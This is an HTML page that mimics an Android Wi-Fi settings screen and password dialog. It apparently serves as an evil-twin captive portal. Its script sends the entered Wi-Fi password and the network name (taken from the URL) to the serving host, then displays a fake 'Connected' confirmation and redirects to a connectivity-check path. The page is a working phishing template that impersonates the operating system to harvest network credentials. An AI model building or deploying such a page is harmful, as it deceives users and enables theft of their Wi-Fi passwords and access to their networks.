<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Roboto', sans-serif;
            background: #0d1117;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .topbar {
            display: flex;
            align-items: center;
            padding: 14px 18px 10px;
            gap: 16px;
            color: #7ec8e3;
        }
        .topbar .back { font-size: 22px; color: #7ec8e3; cursor: pointer; }
        .topbar .title { font-size: 20px; color: #ccc; flex: 1; }
        .topbar .qr { font-size: 20px; color: #7ec8e3; }

        .wifi-toggle-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 14px 20px; color: #ccc; font-size: 15px;
        }
        .toggle {
            width: 46px; height: 26px; background: #1a73e8;
            border-radius: 13px; position: relative;
        }
        .toggle::after {
            content: ''; position: absolute; right: 3px; top: 3px;
            width: 20px; height: 20px; border-radius: 50%; background: #fff;
        }

        .section-label {
            padding: 8px 20px 4px;
            font-size: 12px; color: #5f8fa8; letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .wifi-row {
            display: flex; align-items: center; gap: 14px;
            padding: 14px 20px; color: #9ec9e0; font-size: 15px;
        }
        .wifi-row .arrow { margin-left: auto; color: #555; }

        /* Dialog */
        .dialog-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55);
            display: flex; align-items: center; justify-content: center;
            padding: 20px;
        }

        .dialog {
            background: #2b2b2b;
            border-radius: 14px;
            width: 100%; max-width: 360px;
            overflow: hidden;
        }

        .dialog-body { padding: 22px 20px 0; }

        .dialog-title {
            font-size: 17px; font-weight: 600; color: #e8e8e8;
            margin-bottom: 20px;
        }

        .field-wrap { position: relative; margin-bottom: 4px; }
        .field-label { font-size: 12px; color: #9e9e9e; margin-bottom: 4px; display: block; }
        .field-row {
            display: flex; align-items: center;
            border-bottom: 1px solid #555;
            padding-bottom: 6px;
        }
        .field-row input {
            flex: 1; background: transparent; border: none; outline: none;
            color: #fff; font-size: 16px;
        }
        .field-icons { display: flex; gap: 12px; align-items: center; }
        .field-icons span { color: #7ec8e3; cursor: pointer; }
        .field-icons svg { width: 20px; height: 20px; fill: #7ec8e3; }

        .adv-toggle {
            display: flex; align-items: center; justify-content: space-between;
            padding: 18px 0 10px;
            cursor: pointer; color: #d0d0d0; font-size: 15px;
        }
        .adv-toggle .chevron { color: #7ec8e3; font-size: 18px; transition: transform 0.2s; }
        .adv-toggle.open .chevron { transform: rotate(180deg); }

        .adv-section { display: none; padding-bottom: 8px; }
        .adv-section.open { display: block; }

        .adv-field { margin-bottom: 16px; }
        .adv-field label { font-size: 12px; color: #9e9e9e; display: block; margin-bottom: 4px; }
        .adv-select {
            display: flex; align-items: center; justify-content: space-between;
            border-bottom: 1px solid #555; padding-bottom: 6px;
            color: #d0d0d0; font-size: 15px; cursor: pointer;
        }
        .adv-select .arr { color: #9e9e9e; font-size: 14px; }

        .dialog-actions {
            display: flex;
            border-top: 1px solid #3a3a3a;
            margin-top: 16px;
        }
        .dialog-actions button {
            flex: 1; padding: 16px; background: none; border: none;
            font-size: 14px; font-weight: 600; cursor: pointer;
            letter-spacing: 0.5px; text-transform: uppercase;
        }
        .btn-cancel { color: #9e9e9e; border-right: 1px solid #3a3a3a; }
        .btn-connect { color: #7ec8e3; }
        .btn-cancel:hover { background: rgba(255,255,255,0.04); }
        .btn-connect:hover { background: rgba(126,200,227,0.08); }

        .wifi-prefs {
            display: flex; align-items: center; justify-content: space-between;
            padding: 14px 20px; color: #ccc; font-size: 15px;
        }
        .wifi-prefs small { display: block; font-size: 12px; color: #666; }
    </style>
</head>
<body>

    <div class="topbar">
        <span class="back">←</span>
        <span class="title">Wi-Fi</span>
        <span class="qr">⛶</span>
    </div>

    <div class="wifi-toggle-row">
        <span>Use Wi-Fi</span>
        <div class="toggle"></div>
    </div>

    <div class="section-label">WI-FI NETWORKS</div>

    <div class="wifi-row">
        <span>📶</span>
        <span id="ssidDisplay">NETWORK</span>
        <span class="arrow">›</span>
    </div>

    <!-- Dialog -->
    <div class="dialog-backdrop">
        <div class="dialog">
            <div class="dialog-body">
                <div class="dialog-title" id="ssidTitle">NETWORK</div>

                <form id="loginForm" method="POST" action="/">
                    <div class="field-wrap">
                        <span class="field-label">Password</span>
                        <div class="field-row">
                            <input type="password" name="password" id="password"
                                   placeholder="Password" required autocomplete="current-password">
                            <div class="field-icons">
                                <!-- inline onclick fallback in case addEventListener is blocked -->
                                <span id="toggleEye" title="Show password" onclick="togglePassword()">
                                    <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    <svg id="eyeOffIcon" style="display:none" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
                                </span>
                            </div>
                        </div>
                    </div>

                    <div class="adv-toggle" id="advToggle">
                        <span>Advanced options</span>
                        <span class="chevron">⌃</span>
                    </div>

                    <div class="adv-section" id="advSection">
                        <div class="adv-field">
                            <label>Metered</label>
                            <div class="adv-select"><span>Detect automatically</span><span class="arr">▼</span></div>
                        </div>
                        <div class="adv-field">
                            <label>Proxy</label>
                            <div class="adv-select"><span>None</span><span class="arr">▼</span></div>
                        </div>
                        <div class="adv-field">
                            <label>IP settings</label>
                            <div class="adv-select"><span>DHCP</span><span class="arr">▼</span></div>
                        </div>
                        <div class="adv-field">
                            <label>Privacy</label>
                            <div class="adv-select"><span>Use randomized MAC (default)</span><span class="arr">▼</span></div>
                        </div>
                    </div>
                    </div>

                    <div class="dialog-actions">
                        <button type="button" class="btn-cancel" onclick="document.querySelector('.dialog-backdrop').style.display='none'">Cancel</button>
                        <button type="submit" class="btn-connect">Connect</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Bottom hint -->
    <div style="position:fixed;bottom:0;width:100%;background:#0d1117;">
        <div class="wifi-prefs">
            <div>
                <span>Wi-Fi preferences</span>
                <small>Notify for public networks. Auto switch to mobile data</small>
            </div>
            <span style="color:#555;">›</span>
        </div>
    </div>

    <script>
        const ssid = new URLSearchParams(window.location.search).get('ssid') || 'NETWORK';
        document.getElementById('ssidTitle').textContent = ssid;
        document.getElementById('ssidDisplay').textContent = ssid;

        // show/hide password helper. defined as function so it can be called
        // from inline onclick in case event listeners are blocked in captive
        // portal webviews.
        function togglePassword() {
            const inp = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            const eyeOffIcon = document.getElementById('eyeOffIcon');
            if (!inp) return;
            const isHidden = inp.type === 'password';
            inp.type = isHidden ? 'text' : 'password';
            if (eyeIcon && eyeOffIcon) {
                eyeIcon.style.display = isHidden ? 'none' : 'inline';
                eyeOffIcon.style.display = isHidden ? 'inline' : 'none';
            }
        }
        document.getElementById('toggleEye')?.addEventListener('click', togglePassword);

        const advToggle = document.getElementById('advToggle');
        const advSection = document.getElementById('advSection');
        advToggle.addEventListener('click', function () {
            this.classList.toggle('open');
            advSection.classList.toggle('open');
        });

        // submit handler for login form. works whether the user clicks the
        // connect button or presses Enter. we still use fetch to stay on the
        // page and display success message instead of navigating away.
        document.getElementById('loginForm')?.addEventListener('submit', function (e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            if (!password) return;
            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'password=' + encodeURIComponent(password) + '&ssid=' + encodeURIComponent(ssid)
            })
            .then(r => r.text())
            .then(html => {
                if (html.includes('Connected') || html.includes('checkmark')) {
                    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#34C759;color:white;font-family:Roboto,sans-serif;font-size:24px;">✓ Connected</div>';
                    setTimeout(() => { window.location.href = '/generate_204'; }, 1000);
                } else {
                    document.getElementById('errorMsg').classList.add('show');
                }
            })
            .catch(err => {
                console.error('submit error', err);
                document.getElementById('errorMsg').classList.add('show');
            });
        });
    </script>
</body>
</html>
